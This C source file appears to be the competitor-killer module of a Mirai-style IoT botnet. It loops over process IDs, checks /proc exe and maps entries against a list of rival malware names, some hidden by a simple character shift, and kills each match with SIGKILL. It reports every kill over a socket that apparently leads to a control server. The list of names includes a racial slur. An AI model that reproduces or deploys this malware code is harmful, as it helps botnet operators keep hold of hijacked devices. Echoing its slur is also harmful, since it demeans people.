#include <stdio.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include "includes.h"

// Global enum
enum
{
    MIN_PID = 255,
    MAX_PID = 13000,
};

typedef int bool;
enum { false, true };

char *strMaps[] = {
	"cnc",
	"dvrsupport",
	"mirai",
	"blade",
	"demon",
	"hoho",
	"hakai",
	"satori",
	"messiah",
	"mips",
	"mipsel",
	"sh4",
	"superh",
	"x86",
	"armv7",
	"arm4",
	"arm5",
	"arm6",
	"arm7",
	"armv6",
	"i686",
	"powerpc",
	"ppc",
	"i586",
	"m68k",
	"sparc",
	"armv4",
	"armv5",
	"440fp",
	"miori",
	"nigger",
	"kowai",
	"storm"
};

char *strExe[] = {
	"gyukhoshu", //dvrhelper
	"frurqd", //corona
	"gxsv", //dups
	"kdndl", //hakai
	"vdwrul", //satori
	"pdvxwd", //masuta
	"erwqhw", //botnet
	"fudfnhg", //cracked
	"pludl", //mirai
	"fd|rvlq", //cayosin
	"ghprq", //demon
	"rykphwkrg", //ovhmethod
	"vwgiorrg", //stdflood
	"xgsiorrg", //udpflood
	"wfsiorrg", //tcpflood
	"kwwsiorrg", //httpflood
	"fklqhvh idplo|", //chinese family
	"phvvldk", //messiah
	"gdnx", //daku
	"klwr", //hito
	"rvlulv", //osiris
	"nrzdl", //kowai
	"plrul", //miori
	"qljjhu", //nigger
	"nloohu", //killer
	"vwrup", //storm
	"khoor iulhqg", //hello friend
	"opdrnhn" //lmaokek
};

bool mem_true(char *maps_buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if(str_len > buf_len)
        return false;

    while(buf_len--)
    {
        if(*maps_buf++ == str[matches])
        {
            if(++matches == str_len)
                return true;
        }
        else
            matches = 0;
    }

    return false;
}

void killer_init(int sock, int main_pid)
{
	int kpid = fork();
    if(kpid > 0 || kpid == -1)
        return;
	
	printf("killer started \n");
	int total_killed = 0, exe_killed = 0, maps_killed = 0, killed_this_scan; 
	char report_buf[156], decrypted[18], *kill_buf = "killed pid\n";
    while (1)
    {
        int f = 0, method = 0, res = -1;
		
		killed_this_scan = 0; 
		
        for (f = MIN_PID; f < MAX_PID; f++)
        {
             if (f == getpid() || f == main_pid)
                continue;

             char dirAlloc[65] = {0}, pid[10] = {0}, buffer[2048];
             char *dirBuf = dirAlloc; // buffer pointer.
             //itoa(f, pid, 10); // convert base10 to string
             sprintf(pid, "%d", f);

             for (method = 0; method < 2; method++)
             {
                 int x, y;

                 if (!method) // exe
                 {
                     strcpy(dirBuf, "/proc/");
                     strcat(dirBuf, pid);
                     strcat(dirBuf, "/exe");

                     res = open(dirAlloc, O_RDONLY);
                     if (res == -1)
                        break;

                     //printf("Reading exe strings [%s]\n", dirBuf);

                     while (( y = read(res, buffer, sizeof(buffer))) > 0)
                     {
						 int inc;
						 for (inc = 0; inc < strlen(buffer); inc++)
        					{
        						buffer[inc] = tolower(buffer[inc]);
        					}
                         for (x = 0; x < (sizeof( strExe ) / sizeof(unsigned char *)); x++)
                         {
							sprintf(decrypted, "%s", strExe[x]);
							decrypt(decrypted);
                            if (mem_true(buffer, y, decrypted, strlen(decrypted)))
                            {
                                #ifdef DEBUG
                                printf("[exe_string_scan] match found, killing pid %s:%d\n", decrypted, f);
                                #else
                                kill(f, 9);
                                #endif
								
								total_killed++;
								exe_killed++;
								killed_this_scan++;
								
								write(sock, kill_buf, strlen(kill_buf));
                                close(res);
                                break;
                            }
							enc(decrypted);
                        }
                     }


                     memset(buffer, 0, 2048);

                     readlink(dirBuf, buffer, sizeof(buffer));

                     //printf("Readlinking exe strings [%s] [%s]\n", dirBuf, buffer);
					 
                     for (x = 0; x < (sizeof( strMaps ) / sizeof(unsigned char *)); x++)
                     {
						 int inc;
						 for (inc = 0; inc < strlen(buffer); inc++)
        					{
        						buffer[inc] = tolower(buffer[inc]);
        					}
                        if (strstr(buffer, strMaps[x]))
                        {
                            #ifdef DEBUG
                            printf("[exe_readlink_scan] match found, killing pid %s:%d\n", strMaps[x], f);
							//sleep(1);
                            #else
                            kill(f, 9);
                            #endif
							
							total_killed++;
							exe_killed++;
							killed_this_scan++;
							
							write(sock, kill_buf, strlen(kill_buf));
                            close(res);
                            break;
                        }
                    }

                    close(res);
                 }

                 if (method) // maps
                 {
                     strcpy(dirBuf, "/proc/");
                     strcat(dirBuf, pid);
                     strcat(dirBuf, "/maps");

                     res = open(dirAlloc, O_RDONLY);
                     if (res == -1)
                        break;

                     read(res, buffer, sizeof(buffer));
                    // printf("Reading maps [%s] \n", dirBuf);
                     for (x = 0; x < (sizeof( strMaps ) / sizeof(unsigned char *)); x++)
                     {
						 int inc;
						 for (inc = 0; inc < strlen(buffer); inc++)
        					{
        						buffer[inc] = tolower(buffer[inc]);
        					}
                         if (strstr(buffer, strMaps[x]))
                         {
                             #ifdef DEBUG
                             printf("[maps_scan] match found, killing pid %s:%d\n", strMaps[x], f);
                             #else
                             kill(f, 9);
                             #endif
							 sprintf(kill_buf, "killed pid\n");
							 total_killed++;
							 maps_killed++;
							 killed_this_scan++;
							 write(sock, kill_buf, strlen(kill_buf));
                             close(res);
                             break;
                         }
                     }

                     close(res);
                 }
             }
        }
		//sprintf(report_buf, "[killer] - %d total kills | %d killed last scan | maps killed [%d] | exe killed [%d]\n", total_killed, killed_this_scan, maps_killed, exe_killed);
		
		//if(killed_this_scan > 0)
		//	write(sock, report_buf, strlen(report_buf));
		
		sleep(2.5); //give the skids 3 secs to find our proc ; )
    }
}


